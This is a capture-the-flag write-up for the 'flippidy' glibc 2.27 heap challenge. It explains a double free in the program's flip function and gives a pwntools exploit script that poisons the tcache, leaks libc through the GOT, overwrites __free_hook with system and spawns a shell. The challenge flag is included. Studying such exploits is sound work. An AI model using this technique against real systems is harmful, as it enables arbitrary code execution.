# flippidy
## Overview
This is a glibc 2.27 heap challenge.
We have a program which allows us to create an array of strings.
We decide how many strings we want. Each string will be at most 48 characters long.

After creating the array of strings, we can 'flip' the array, which simply means we can switch the first element with the last element, the second element with the second last element, and so on.
The program does not give us a way to actually view our list of strings.

## The Menu
Something weird that left me confused is how the menu is implemented.
```c
void printMenu(){
  int i; // [rsp+Ch] [rbp-4h]
  puts("\n");
  for ( i = 0; i <= 3; ++i )
    puts(menu_entries[i]);
}
```

`menu_entries` is an array of strings, each of which represents a line in the program's menu.
```
.data:404020 off_404020      dq offset aMenu         ; DATA XREF: printMenu+2A↑o
.data:404020                                         ; "----- Menu -----"
.data:404028                 dq offset a1AddToYourNote ; "1. Add to your notebook"
.data:404030                 dq offset a2FlipYourNoteb ; "2. Flip your notebook!"
.data:404038                 dq offset a3Exit        ; "3. Exit"
.data:404040 aMenu           db '----- Menu -----',0 ; DATA XREF: .data:off_404020↑o
```

This works and it makes sense but it seemed overly complex for this program, it does not provide any advantage.
Turns out that it helps us develop the exploit.

## The Problem
The problem is exactly with this 'flip' functionality.
Looking at the code of the function, I immediately began to think what would happen in certain edge cases. Here is a commented decompilation of the function.
```c
unsigned __int64 flip()
{
  void **rightPtr; // rbx
  void **leftPtr; // rbx
  bool emptyLeft; // [rsp+Ah] [rbp-A6h]
  bool emptyRight; // [rsp+Bh] [rbp-A5h]
  int i; // [rsp+Ch] [rbp-A4h]
  char leftCopy[64]; // [rsp+10h] [rbp-A0h] BYREF
  char rightCopy[72]; // [rsp+50h] [rbp-60h] BYREF

  for ( i = 0; i <= notebookSize / 2; ++i )
  {
    memset(leftCopy, 0, sizeof(leftCopy));
    memset(rightCopy, 0, 64uLL);
    emptyLeft = 0;
    emptyRight = 0;
    // is the string from the left empty?
    if ( *((_QWORD *)notebookBuf + i) )
    {
      // if it's not, copy its content and free the chunk
      strcpy(leftCopy, *((const char **)notebookBuf + i));
      free(*((void **)notebookBuf + i));
    }
    else
    {
      // if it is, set the boolean
      emptyLeft = 1;
    }
    // do the same for the string from the right
    // note: with notebookSize = 0, this would access index minus 1, 
	// which contains the chunk's size.
    // this would lead to a segfault in the following strcpy.
    // with notebookSize = 1, this would access index 0, 
	// which is the same index we accessed earlier!
	// This effectively causes a double free.
    if ( *((_QWORD *)notebookBuf + notebookSize - i - 1) )
    {
      strcpy(rightCopy, *((const char **)notebookBuf + notebookSize - i - 1));
      free(*((void **)notebookBuf + notebookSize - i - 1));
    }
    else
    {
      emptyRight = 1;
    }
    // cancel both pointers from the list
    *((_QWORD *)notebookBuf + i) = 0LL;
    *((_QWORD *)notebookBuf + notebookSize - i - 1) = 0LL;
    if ( !emptyLeft )
    {
      // if left was not empty, make a new chunk with its content
      // and assign it to the right pointer
      rightPtr = (void **)((char *)notebookBuf + 8 * (notebookSize - i) - 8);
      *rightPtr = malloc(48uLL);
      strcpy(*((char **)notebookBuf + notebookSize - i - 1), leftCopy);
    }
    else
    {
      // else.... cancel it again lol?
      *((_QWORD *)notebookBuf + notebookSize - i - 1) = 0LL;
    }
    if ( !emptyRight )
    {
      // do the same for right pointer
      leftPtr = (void **)((char *)notebookBuf + 8 * i);
      *leftPtr = malloc(48uLL);
      strcpy(*((char **)notebookBuf + i), rightCopy);
    }
    else
    {
      *((_QWORD *)notebookBuf + i) = 0LL;
    }
  }
}
```

## The Exploit
Here is the relevant part of the script. 
You can find the full script and all other files below.
```python
# Make the list 1 string long
p.sendlineafter('how big', '1')

# The address of the menu array and of each string in it
menu_entries_arrayptr = 0x404020
menu_strings = [b'----- Menu', b'1. Add', b'2. Flip', b'3. Exit']
menu_entries = [next(elf.search(s)) for s in menu_strings]
menu_array = b''.join([p64(addr) for addr in menu_entries])

# Create a chunk and write the array's address to it
add(0, p64(menu_entries_arrayptr))

# Trigger the double free in flip, adding menu_entries_arrayptr to bin list
# Basically: chunk gets freed twice, first malloc gives us the chunk back
# and the menu array ptr is copied to it
# Second malloc gives us the same chunk again,
# and the menu array ptr is used as next ptr
# The tcache now has size 0 (2 frees 2 mallocs)
flip()

# The pointer at menu_entries_arrayptr was added to the tcache bin
# We can take it even if tcache now has size 0, there are no controls
# When we take it the size will underflow to 0xff,
# which means the next frees would go to fastbin
# So now we have a fake free chunk at the string '----- Menu' etc, 
# which is right after the menu entries array
# Modify first element of menu entries to point to puts got,
# so that we leak it when menu is printed
# Leave the other elements unmodified
# there is no need to change them and also cause I'm a good, well-mannered boy
# Write a pointer to menu_entries[0] at menu_entries[0]
# this makes a loop in the tcache list,
# it is basically an artificial double free which is awesome
add(0, p64(elf.got['puts']) + menu_array[8:] + p64(menu_entries[0]))


# the first element of the menu was replaced with a pointer to puts got
# Retrieve this leak and calculate libc address
p.recvline()
p.recvline()
puts_leak = u64(p.recv(6) + b'\x00\x00')
libc.address = puts_leak - libc.sym['puts']
log.info(f'Puts: {hex(puts_leak)}')
log.info(f'libc: {hex(libc.address)}')

# Now make use of the 'artificial double free'
# let's add __free_hook to the tcache bin list
# The tcache bin right now is menu_entries[0] -> menu_entries[0]
# We malloc to get the chunk at menu_entries[0], 
# write free_hook addr on it, 
# then we malloc again and get the same chunk again
# This second malloc, free_hook will be treated as next ptr,
# so will be added to tcache by tcache_put
add(0, p64(libc.sym['__free_hook']))
add(0, 'cute doggo lol')

# Next malloc gives us a chunk on free_hook, write pointer to system 
# Next call to free will call system instead
add(0, p64(libc.sym['system']))

# The tcache is now empty because free_hook was set to NULL
# So we can simply allocate a new chunk without error
# We set its contents to /bin/sh then we free it to call system('/bin/sh')
add(0, '/bin/sh\x00')
flip()
```

## Flag
dice{some_dance_to_remember_some_dance_to_forget_2.27_checks_aff239e1a52cf55cd85c9c16}
